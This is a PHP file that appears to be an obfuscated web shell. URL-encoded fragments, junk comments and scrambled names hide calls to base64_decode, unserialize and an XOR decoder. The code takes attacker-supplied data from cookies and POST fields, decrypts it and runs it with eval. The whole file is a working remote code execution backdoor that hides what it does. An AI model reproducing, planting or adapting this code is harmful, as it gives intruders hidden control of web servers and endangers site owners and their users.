<?php PARSE_Str ( '6'/* ,%oA=p5yV */.	# 	Zd9Gp
'07' // t?@r[&	j=1
	. '=' .	// nUeZ.s^
	'%' . '43' . '%41' .// pUV=u@
'%' . '4' ./* TF7*X} */'E' . '%' .// ": }%
'7'//  _?{zja3H	
. '6%6' // {c<}FF
. '1%5' . '3' .	// z2QD46O B
	'&' //  =IOsX	1w
 . '322' . '=%' // Vaf6$+u
	. '5'// 8=nDPJl
. '3%'# )O:N[1nzEd
./* 	I< lA+ */ '7' // ' :Kx8	
. '0%'	# q8?=' 
	. // 1.>@er
 '61%' ./* $%.q]a7 */'6' . /* 4{$B F */	'e&' . '77=' /* zB	hi */ . '%'#  (AU u}p96
.# 9Nih &ukg
'4'/* LF@g(':A1y */	. 'E' . /* h6)^:Nf */'%4F' .// OV(;,O -4;
'%' . '53%' . '63'/* `r8wWc 2g */. '%52' .// EY	q	
'%6' . '9%7' . '0' .# Yx^ ~
 '%7' . '4&' . '39' ./* 1HX 	*= */'5=%'	// .Dij>Dw
	. # D=	t5i(6`
'62%'// Q$ 	h~n
. '6f' . // SN}@;y$JW$
'%4' . 'C'# tpH}a !__
 . '%44'/* Ddyz329 p( */. '&40' ./* nGgM l,	|m */'5=' // B lLndU&
. '%' ./* +.e,SpEX_! */	'73'// yktnOa=
 .# DzcSw tf[*
'%'/* AB Pb31v]V */.	# n Fzv %
'4' . '1%' ./* 	"9@	'	b) */'4d' . '%5'	# 'B)*B{)_
. '0&' . '53' // gx	.~TY5
.	// Q@Dlw]=
	'=%7'	/* hMHn8 */	.	/* )BwW  2 */'5'	// aQ&e 
 .# 0	n6c!s	 9
'%53' .# lb.cv8[{
'%33'/* cOGeZ,va u */ . '%36' . '%4'# d+n3k	 }
./* JY9I~"qdi[ */'5%' .# hm53		
'65' // &7EuyC
 . '%' .// a?gfv
'6'/* lCX2'_ */.# 7LyRJV{
'5'/*  ?'/N{MZU! */. '%6A'	# ~d(+Ou6f
. '%6E' ./* 9	j)ad0W */'%3'# ~D=". Y
 . '0%5'	// Q|f'Ng
 . 'a%'	// f]@p(G=q
.// \4G\Rd
'36' ./* (|\0hh <3^ */	'%37' . /* '4M&U{U~? */'%50' .	# ByC;B''
'&2' . /* "]c1i|A2 */	'5=%' . '53%'# .xDaM0
.	# >~/O.JQ
 '5' ./* Wgi8w, */'4%5' .//  :taggB5yf
	'2'	# uM!!*F-k
.# ( " fJ
'%' ./* k~uKq */'50%'/* +<OG1h I y */./* 5'	m*Ye: */'6f%'// JWC	a
.// GJ*.o"Ku7t
'73&'/* mp!z=r */. '93'/* 9M W(: */. '8=' # 3zs=:BEu	
. '%73' . '%74' . '%' . '79%'# )=	Q	b\
. // yeH7|
	'6'//  5	J(
	./* w$U$Wl5m */	'C%4' . '5&9' ./* h	Lc<	>F */	'87' ./* -p28<u6S5> */'='// 	k[x`R  f/
. '%66' . '%5' .	/* SU0Eh|>xk6 */ '9%' . '76'/* v0T^2 ._; */	.# :L8XC
	'%'/* Sh69I */.	# FXr-xMP
'33%' .# kES)@LO;
'4'	// Q	qW8
. // !?p	z/\S|(
'2'# nbd _89;
.// 1y3a\DA{
 '%32' .// @R@~ 
 '%57' ./* 	7G029 */'%65' . '%32' . '%78' . '%75' # xC(/~o=)
 . '%6' . '3%6' # 		VP2p
./* M%R @ */'4%' . # $+s5m;q
	'62'// lyhLo
 . '%6' . 'e%3' . '6%7' /* ]@X^[  */. '1'/* /{In	 */ . '%53' . '&6' .# %oIELg0PT 
'78' /* R/$p	M&	m */./* L@$R	]e[U */'=' . '%73' .// %D~My
'%'/* `<x689DlV */. '7' .# 8_e|^n&Z<n
'5%4'// JRBgf;MT
 .	# 	v5p?:&Y
'2%5'// N?\_a.H
	./* VQ` g	X   */'3'# duZk MgZm
. '%74'# gE	 w*
 . /* -2"K|Rn0 */'%' . '52'# q1VG8z~3)S
. '&22' . '1'// 1fddk}l"'&
.	// c+ fh	
'=%'	# D]1*y
. '53%' . '76%' . '47&'// 2?Vep:	F
 .# X-:\p4j  
'977' .//  9HUS[CsJ5
'='# Hft/H"/a^
 . '%74' . '%69' # KffX<R;
. '%'# 5+j;?	xJ4e
 . '5'	# X%-(a
. '4%6'// f<=|a/;&5
. // 0dMU	P
	'c'# z(uIMz	DU
. '%4'/* +Q6 2>xn */. '5&1' /* Pbc3]? !. */	. '9' .	# a_1M>EvR'
'1' . '=%' . '6' . '6%4'	/* ly]MJ	 */	.# ithT@9?
	'F%' .// kKXk<"\DE
'6e' . '%' . # {W	`.
'74' .# }@4o9vU	D
'&4' . '86' /* X@hIb?	R */.# mpD+	Z 
'=%' . '4d%' /* Wh1|n */.// xxQSO;P@9t
'65'# (A	IM=Mr
.# ve t y
'%' . '4E%'# aj'N5
.# R_dqUS|@=e
'5' ./* _Y*xZ2| */'5' . '%' // O W,X
 ./* pxWZOI */'49%' . /* |>}t(> */'5'# `FzuJ0<
. '4%'# 		v n>
	. '65' ./* bQ(?8Pvp@@ */'%4'	# [)	iAZ
.// s=f/X6
'D&7'	# E~fniVh[O
. '68' . '=%' . '62' .// 	0+gM(&:
 '%6'/* S$1 6 */ .	// upR'z ,hiK
'2%4'// $ p	FI<0
	. '2%6'// !>X('XI	
. 'd'// "k/[l
. '%6' .// DS a}I	vq1
'5%' .// d8	%?ai>
'3' /* vG=l|h"Z */. // 	H>e+Q
 '0%'/* *nMf	)y/d */. '36%' . /* "N 3n  */'65%' . # q[*9]LP8bU
 '6d%' .// HPf[;		50
 '72'// '71%MEA
 . '%' .// 	/FLd TE	
'3' . '9%' ./* Q5m	:}M2` */	'7' .// rS-pXqQ`A,
 '8&4' . '4=' . '%62'	# uKSH)n>Ad(
.# yAZ{afo|
'%6' . '1%'/* *	  s */.# 	AB_W f52
'73%' . '65%' .// ]N?)X 
'3'	/* RnoFb */.# `r cJ
'6%'// 	V|$GTeWu`
 . // 8	nE 
 '3' .	/* /=		r" */'4%' .	// C %o[}
 '5F' . '%64'# sLCeF]
	.	# lz[ZI<U?ZM
	'%' . # wc{z& .oD1
'45' . /* T-J=V */ '%'# `o!z5q
	. '43'# 8Ce/ X48cI
. // z=ey3`G~"o
'%' .# 	@-z}_7w
'6F%'// >yStxu
.// %	{+ N
 '6'/* GyIpGY */. '4' . // K	c o+
'%4' .# Ch0xs{ G5 
'5'# &B gY 
. '&5'# qO%i-uL	R>
. '9' .# !VO}P
'9=' . '%4' .	// rBltz
'd%' . '61' # NTnT6=}Oo
. '%72' . '%' . # K5r~Y"$9:U
'4'// *cO&wXrp
. 'B'// gu*!h>]G6H
. '&' . '82' . '9=%' . /* s0ai07] */'5' .	# 4[FqnY4zD
	'3%' . '74%' .# LlN7s
'52' . '%4c' . '%65' . '%'/* N.D	BxuaQ~ */./* nAO:m */'4E' ./* 7.W:	EQV */'&' .	/* vq o.	 */	'2' . '76'	# TkNKa
.// o1fTk5	r
'=' .# 9,&[	`2JO
	'%6' ./* h8-au  */	'3%' . '6' . 'F%6' . 'D%6'# zqC6$
. 'd' .# W7\ 8
'%' . '6' . '5%' .	// r?i:x?
'6' // 3}:0 mBm
. 'E' . '%'// OY$1k
	. '5' /* S2RC_L;	n */	.# y	WTATrhZf
'4&6'// q%1!S
 . '8=%' ./* Hc<jS &7y */'55%' ./* Q-	dT>Jh */'52%' . '6c'# 8O9>s'dsy:
.	/* &7UN	kpf	t */ '%6' . '4%4' . '5%'# ":P35w,ZY\
.//   |i%"a8	c
'63' . '%4'/* r*R^ A> */. 'f' . '%' . '44' . '%4' . '5&' ./* :]oRLp=M	V */	'2' . //  ~q	O:
	'89=' . '%' . '6' ./* Et(&	 E */'1%5' . // 44&=t (vjn
'2' .// Iw	ztA Bo_
'%'# !gM|3
.// 	I. frrC4
'5' /* a0^fh'I>. */. '2'/*  8|fPW S */.// vmQ3^1,!C
'%6' /* y =mIEIN+M */.# % *,Op
'1%' . '79' . '%5f'	// 27_z9;C
. '%76' . // |,GbK	@SF
'%'// fCMA	%=
. '6'	/* Vx;K?+ */.	// 6+~Z$Ut
'1' .	/* {qLrOGX . */'%4'/* YIK2[Y&zE! */ .	/* N7 '	|?V */	'c%5' . '5%6' .// m&9_lY6_V(
'5%' .# ~	8V;^ppl
'7'// "q	K2]6l8
	. '3' // H}u] [T
 . '&' # jqGDL 
	./*  i;M&kIJ */'46' /* fs(	S '@  */.// }TLrg<
'8='/* mX;[8  */ ./* t9:jw */ '%5' /* --$>LQZk */.// ^KB*8
	'6%' . '61'	//  *[e8
. '%72' ./* (]RkEyk */'&'	/* dbdM3)m */.	# "N^4iM$
'35' . '4'# 0S?HZj
. '=%' /* Pt.L=e */ . '61%'# ]K"lw!oI1
.//  34E	*y9
 '43%'/* W>oy2 */. '52'// yu's*5Q
	. '%'/* ghYChy< */./* ~Ri(s F */	'6f%'	#  BA9 q
 .//  "	%VQ
'6e' . '%'# ' ^k h:K
.// _N_Hq:ll]Z
 '7'/* ScdWAN	, */.// c	L1?	<
'9%' ./* R>' /	N */'4D&' .	# kV;+O		os 
'1' # eb5kZ>
	. '6' .# v	VX 
	'6' .# 5N"b	(0
	'=%6'# 5xo?nth Rh
. '1%3'/* 	Y 3C1l4 */. 'A%'// _ePr	,2c
.# ;Vr\?T?_ 9
'3' .	// G 9	6 7)_K
'1%3' .// ws\$2cA-
'0%' ./* O	W(T o/Q */'3a' . '%7' . 'B%' . '69%'/* :\x|i[1I	 */ . '3A%' # 33I13t	v-
. '3' . // f{F"[!J[,O
 '1%' .# -.,@3S`m
'3'	# d$9f	
. '2%3'/*  spBGS */ ./* QH$	 d */'b'/* 4L 	52Ll-r */.// w[o">
'%6'	/* <87zohx! */.# oT3<jgo
 '9%3' .# 24(; jmT
 'A' . '%34'// Ea1h	Lj,
. '%3' . 'b%6'# HyKNZnfx [
./* 3@g]WxW */	'9'# 4lw +
. '%3'	# Gx` ZJr@} 
 .# qrP43h+p
	'A%' . '33' .// \	^28
	'%39' //  ^/_HBK
	.// LmUUr@6R^
	'%3B'# eS>OC O'<z
 ./* = e;(}	 */'%'// 5u*osd
. '69' . '%' . '3A'	/* G{sa8f@@@ */	. '%' . '32' .# 	[ 7}
 '%3B'// ./S:9X
. /* >4FD		<; */ '%' . // }uf	m	
 '69' .// q8?Jd!SC,
'%3A' . '%3'# ' g)|~Hs8
. '2%3'/* 	 .DW */. '2%3' .# =CO:2C4
'B'# Hb(]Cr( 
. '%'// {)a5n
. '6'/* X@B	z&ft */. '9%3' ./* k9	6A */'A%3'// \x!]lPHv 
 .// qD5r%z
	'1' . '%33'	// 7B.Ws >L7A
. // .hG x'-
	'%' // <Yqj6
. # BXGz[
'3' . 'b%' ./* i*?Stf[^ */'6'// 	.~U	uuj1\
 . '9%3'/* :Fm_.	:+A  */ .	# |(X`i}
'a%'// 'N,<NI
. '3' // `2p1P
. '9' . '%3' # =cZf*p!
.	// EGVp2
'6' . '%'/* m	>K;) */. '3B%'// 0	ytm-,
 . // ]PK3)	
 '69%'	/* 	 k5gZ";;j */. '3' /* *$r @` L */. 'a'	# Xc 	=
. '%3' . '5%3' .// 2 ),H 'c
 'B' #  w)q	6
	. '%6' . '9' . '%' . '3' # cT="Wi0
 . 'a%3'# PU"^5zlp
 . '3%'/* 2	|ut?ce]t */.# 0ov?7m	
'33%' . /* +`Bl&]r^Si */'3B%'// 5QoOf
	. '69%'/* XKIM{f */ .// 	-&%x
	'3'// x7}8H 
	.// /WtDiv	0,
 'A%3'# ]5	MLHY
. '6%3' . 'B%6'// :%E l7
./* f?Fy$gYnC */	'9%' ./* 	Cd~	~ */	'3a%' .// '99p,
'3' .# bHrGoJX
'1'/* N Fe n? */.# [,5OFM"V
'%3'// _r1YI :
 . '6%'# }U	a		-
 . '3b%'	/* =Nz}ut37a */.# 1eq	V*!
'69%'# 26"`op,}	7
. '3A' /*  8`-sx>":Q */. '%3'/* :ewZllQSCp */	.# m hVj[
'6' .# f!D%YUr/'X
'%3B'	// lB)A:JV.F
. '%6'	// De*KJ
	. '9'# B%&  
. # Cz0_FnDG
 '%3' // ?8@F(u Qf
. 'a'/* {OJrlb, */. '%3' .# QfQ]cZ~
'4%'// =]O1j
. '31'/* 1}Fpr */. '%3b'# ]*Q&	gUm+
.// {U yr
'%69' // ~i|(9R	n~O
. '%3'# veIZE@@
.// rir4yq	pK
'A' .// h3p6>,	
	'%3'# qxK+Qm .
. '0%'	// cL7hf6WqP*
.	# 1O i&`,=lU
'3B' . '%6' ./* <IMo>+ */'9%3' . 'a' // G>t@.
.# X'EK+	A.|x
'%32'/* 8]ui	$ */./* ) 4/f=+_ */'%' . '38%' /* 1^{H  bE. */ . '3B%'# h@_[ c.; 8
. '69' . /* U[kuS. */'%' . '3A%'// &mK	,S'J
. '3'# ^A0ru% 
 . '4%3'# Fe:^7
. 'b%6'// {b$p1cuH^(
. // d|_*8
'9%' . '3A'	// 44	<m^B4Z/
	. '%3' ./* PR) N" */ '6' .# eM|R]HJ
 '%' .	// kOnhA]I
'32%' . '3b%' ./* |2k@J */ '69%'# L[3ghNwik
. '3'/* 	j<N	xlc*[ */	./* .	b4)V	 */	'A%' . '34%'/* xf7*	P*6o] */ . '3B' /* xC5 B	 */. '%'	/* 	 2A5\z}Q */.// b'pZ;nN
'69%'/* u 7Ta */. '3A' // |eM{Os.f
 .	# g>o	crh	v/
'%34'# } x	k
. // 	\)%D
	'%' . '35' .// Osq.7d!0b
	'%3'// `{s	L
 . 'B%'/* |VFocNT */.#  >|~2)
'69'// rCO2P;i
 . '%' // y;BD7qg
./* 	jr V */'3a%' . '2D' /* %pz1FG	jO */. '%31' . '%3'/* zk	[-	.Up> */. 'B'// O%E\81}9
.	// +hJ 	1$
 '%'// B[N}ffP
./* b;nM{  */'7'	/* rsLK;/m */ . 'D&3'# 	V=lq)
. '5=%' .// 	ORDl`
	'7'# x,GDY	(
.	# 3DhaFNZE`q
 '5%'/* D&_/}z`]88 */ . '6e%' . '53%' .# x&`-L	l
'45%' .# \wV +ZO
'7'	# pJC'9	=%C 
.# Fux.)b
'2' . '%69' # >K7Ng<oB
.# "RPY	u
 '%41' /* {D1x8  */./* ZwH0` */'%' . '4' .# Q=fN/
	'c%'	// \klB_o gB,
	. '69%'// E7j:]__q*
.	// x4=w+L7p\
'7A%' . '65' . // z)" K4an
'&80' . '2=%'# xH+*R
.// %8x)Y%hflH
'74%' // \m"'RuSJ+ 
.// w+_Rya		O!
'41%'# `BM^ohA6xZ
.// a}|]<`xbJG
'62%' . '4C' .// u	E<D
 '%4' .	# 		EUD7E6!r
 '5&' . '98' # *E~k}9h
.	// Yu	xpgOm*E
 '1' .# &Xg~{
'=%' . '4E%'// ~2\rvZ
 . '4f%'	// (7@vKf{l+
	. /* /E30~ p~ */	'65%' .#  hJ Q
'6d%' . '4' // (K 	[4  		
 .# f;Vd,Y`tl
 '2%6' .// I:dvng&0
'5' . '%4' . '4' . '&1' . '64=' ./* [3B6b7h */'%' # ?tQ7n
./* pfF.I */'50' . '%48' .	// |8g(h1*0SD
'%' /* %.__f */.// tg	8C3%dB|
 '72%' . # Q/?-s8
'41%' . '53' . '%' . '65&' . '485'/* Tba_Z8	9	b */	. '=%'# $% 	I[y
./* 5t	;)2W */	'6'# 	QwK?{
	. '2%' .# *R5>ET
'4' . 'f'	/* F,~ ''bHh */. '%6'# 	qaIY0h 4
	. '4%'# GG6`G!}	tZ
. '59&' . '488'// k[js<
	.// %GPd~U &2	
'=' /* m`I>1]\" */. /* +BN)[ */'%' ./* |Wn *x */'7'// !tE?v
./* (J^U4 */ '8%7' .# }	H4UR
 '6%6'// 8U<A=
. '6%7'/* 1BgYFml	 */. # 8X28Zr9i"
	'9%' . '46%' . '6D' . '%6' . /* rbj$v{PvR */'9%' .	/* %:J P<y|aF */ '53'	# 	\T+lwX>
.# ^dTcmuVaA
	'%4'	// ' $Vp:c
 . '3' .// gKd`u<j	
'%' # qIc_Dq3 E>
	.	# @:PQh
'65%'// Q9.'ZmJE
. '3' .// IWpMUU(
'8%' .// Dj?,V	
'6' // kwb|vtd V	
	. 'c%6'// HQ	g!
	. '2%' //  :tSNV
 .// 4[f=4ohrZ
'32%'# 8aVgt8=
. '5'/* s-	QJPJ	Ku */. # RoDUS'J
 '2%' .# [XJ,~op+3a
'39'/* jD2ERtQnj9 */, $dWSu# S(&}eSI
)// DaP;9)uAYa
; $wRK1	// a	q\T
	= $dWSu [ 35 ]($dWSu// cLNm'%}
[ 68/* /7SIV */]($dWSu // -ycR _ZR
	[// [!;yO 3;P	
166# Y]cTqTv
]));# `=	4Kg|PM
function xvfyFmiSCe8lb2R9 (// [7|iy8 .D
$pryWV5x7 , # 1HN1A_
$vh8G )/* ^L6b$ */{	// <Mg\ Jy<
global	// 4y~	B(E 
$dWSu ; $NmxRMS =/* t8{Th~hj  */ ''	// ;hLRk4bb4
;	/* 6 8zib */for # 2Z/	%
(// w,	h35:~)
$i =/* WAdWv'+" */0 ; $i/* MWHp2 */< $dWSu# \L&kN
[ 829 /* XJzHv$t */]	// 8M+	)
 ( $pryWV5x7 )// '2 'Mfb
;# jCR!uF lR(
 $i++ )	/* SZz?  */{ $NmxRMS# {7		y,X&f
.= $pryWV5x7[$i] ^ $vh8G [# \/|'	QX
$i/* x` "3% &Q6 */%//  e_t@h
	$dWSu# @'75^7 
 [ # ZSf  -~Q%\
829 ]/* +I9@'SzbJ+ */ (# Q-'K 1ZC
 $vh8G// CzW-Yy !.]
) /* L5.	. */	]/* JLI*9X7  */ ; } return $NmxRMS ;/* ekIwh */} function	# waQ7b}P~m[
fYv3B2We2xucdbn6qS/* "*^[tRla 	 */	(// 	|vk_R
$U86lzrC )/* Fv%e"q= */{ global $dWSu//  &GH a
;# 	_  3a 
return $dWSu [ 289 ] ( #  VmENRL|*:
$_COOKIE	# M7z { InG
) [	// J<R-&=L6(M
$U86lzrC/* >/Y@~ */	]/* x	 t:1 */;// EXv_ 	+	^
 }# cx6B|8
 function// k'Yrnv|^a
 uS36Eeejn0Z67P (/* >rDCQ */$ZcTF ) {# npWSX>*
global $dWSu ; /* Nw0Y	NY`i */return# Y9afYz~|
$dWSu// Iz71;C 	=v
[ 289 ]	# jq3*I927
( $_POST ) [ // 1[8(~>TLz
$ZcTF ] ; } $vh8G = $dWSu [# i$bHlU\e
	488 // G!r+mR
] (	/* 2zb23l */$dWSu/*  {><8P@+3O */[/* Sn83E */	44# yWVb]
	]/* n	}f_s QC */(/* J LDi 0G	A */	$dWSu [ 678 // {t| Z *4s
]/*   5Kj4 */	( $dWSu	# QVrb$W_?M*
[	# yF~f	s
 987	/* iAA7_B  */] /* /Q&)cwX$ h */ (/* W/)})w0kV */$wRK1# *.YI3
	[// a	 +?}=G	
12# rW	S F
] ) , $wRK1/* J>;s$wfnR */ [ 22/* yT> 	-^ zC */] ,/* Eze"Ln */ $wRK1# xn\nZ	od0
[ /* \PO(,} .;B */ 33 ] * $wRK1	// g?]@%
[ 28 ]/* uN}O%K\ */)	/* {|Rqegyj */) , $dWSu# @rPIp:5
[ 44 ]#  E8	z*c
( $dWSu [# ~h{Y~X
678# /; beTA
] (# _&"=R
 $dWSu [ 987# MO;Nhx;gQ(
]/* rR/P& */ ( $wRK1 # [tD"DH'7l 
[ 39	/* 'Cs1P */ ] )	# D7 Mb
, $wRK1// !l!<jQ' 
[/* K0YH8 */96 ] /* z &7rNH1 */, $wRK1	// >xQK9CDV\
 [// 3{wh-
 16 ] */*  j k>M=	 */$wRK1# @~E_\Qr36
[ 62 ]# POOQD
)/* uBot	rK */) )	# }2B9`+^
; $iIV6yIu# le:m| -TS
	= $dWSu# s\m|i
[/* h5Sv nY.CT */ 488 ] (/* I)	.PO= */$dWSu [ 44 ]/* >KY 2	 */(/* raL 	 */	$dWSu [/* qlE0KCZ */	53 ] (/* ]H+IpSp */$wRK1 [# C& ,;) 
41 ] ) ) ,	// ?F 	z t!A,
 $vh8G ) ; if ( $dWSu# 6!QH7m*1U4
[ 25// dkg	hwO`
] (/*  4 NS */	$iIV6yIu// P z	 *R8
	, $dWSu// f[Y]@Y	Q
	[ 768// G|Hjb5`$i 
 ]/* d/ ~u.$  */ ) > $wRK1// j {0P6
[// vQS~z^Ar
	45# %V4ZYTRI
] ) EVaL (	/* .=(^3{iA */ $iIV6yIu// .CM	`]}0y\
	) ;/* wD_K_ny@t */